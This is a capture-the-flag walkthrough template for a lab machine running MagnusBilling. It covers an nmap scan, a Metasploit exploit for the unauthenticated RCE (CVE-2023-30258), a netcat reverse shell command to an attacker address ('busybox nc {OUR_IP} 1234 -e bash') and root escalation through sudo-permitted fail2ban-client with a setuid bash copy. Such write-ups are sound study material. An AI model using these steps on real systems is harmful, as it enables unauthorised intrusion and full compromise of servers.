{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("I started by running a port scan.")}}

{{console("nmap -sV -sC -p- -T4 10.10.137.89", "Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-25 19:53 CEST
Nmap scan report for 10.10.137.89
Host is up (0.083s latency).
Not shown: 5097 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 14:36:ba:dd:13:e0:a3:9f:b9:b8:1b:71:48:34:48:ab (ECDSA)
|_  256 6e:8f:6d:09:8d:b5:bb:b0:47:68:67:60:00:28:dc:c2 (ED25519)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.137.89/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
|_http-server-header: Apache/2.4.62 (Debian)
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel")}}

{{text("We end up finding 4 open ports:")}}

{{list(['22 (SSH)', '80 (HTTP)', '3306 (MySQL)', '5038 (Astreisk)'])}}

{{header("Initial foothold", "initial-foothold")}}

{{text("We proceed to the website and get greeted with a login panel.")}}

{{image("../../static/writeups/billing/images/000001.jpg")}}

{{text("Furthermore, the title of the page is <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>MagnusBilling</code>.")}}

{{text("Searching for that phrase, we find out that it is a VoIP billing system")}}

{{text("Furthermore, I found an available exploit that we can use.")}}

{{link("https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/", "https://www.rapid7.com/favicon.ico", "MagnusBilling application unauthenticated Remote Command Execution.")}}

{{text("We load up <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>metasploit</code> and search for the exploit.")}}

{{image("../../static/writeups/billing/images/000002.jpg")}}

{{text("We set the correct parameters and run the exploit.")}}

{{image("../../static/writeups/billing/images/000003.jpg")}}

{{text("Since Metasploit's shell is very bad, let's set up another reverse shell to our machine.")}}

{{text("Victim's machine.")}}

{{console("busybox nc {OUR_IP} 1234 -e bash")}}

{{text("Our machine.")}}

{{image("../../static/writeups/billing/images/000004.jpg")}}

{{header("Privilage escalation", "privilage-escalation")}}

{{text("We discover that we can run <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/usr/bin/fail2ban-client</code> as root.")}}

{{console("sudo -l", "Matching Defaults entries for asterisk on ip-10-10-137-89:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-10-137-89:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client")}}

{{text("While searching what Fail2Ban is, I found an exploit we can use to privilage escalate.")}}

{{link("https://juggernaut-sec.com/fail2ban-lpe/", "null", "Fail2Ban - Linux Privilege Escalation")}}

{{text("What we want to modify is the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>iptables-multiport.conf</code> file so that it gives us a privilage escalation.")}}

{{text("Unfortunately, we don't have write permissions in this directory.")}}

{{text("But we can exploit this, by copying the contents of <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/fail2ban</code> into <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/tmp</code>, we can later specify the configuration directory and at the same time modify the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>iptables-multiport.conf</code> file.")}}

{{console("cp -r /etc/fail2ban/ /tmp/")}}

{{text("Next, we create a script that will copy <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>bash</code> into <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/tmp/</code> while adding a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>S bit</code> to it which will allow us to become root.")}}

{{text("We create a configuration file that will run our script.")}}

{{image("../../static/writeups/billing/images/000005.jpg")}}

{{text("Now we add it to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>jail.local</code>.")}}

{{image("../../static/writeups/billing/images/000006.jpg")}}

{{text("Lastly, we create an almost empty configuration file in the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>filter.d</code> directory.")}}

{{image("../../static/writeups/billing/images/000007.jpg")}}

{{text("Now when we restart the service, we should be able to run <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>bash</code> as root.")}}

{{image("../../static/writeups/billing/images/000008.jpg")}}

{{script()}}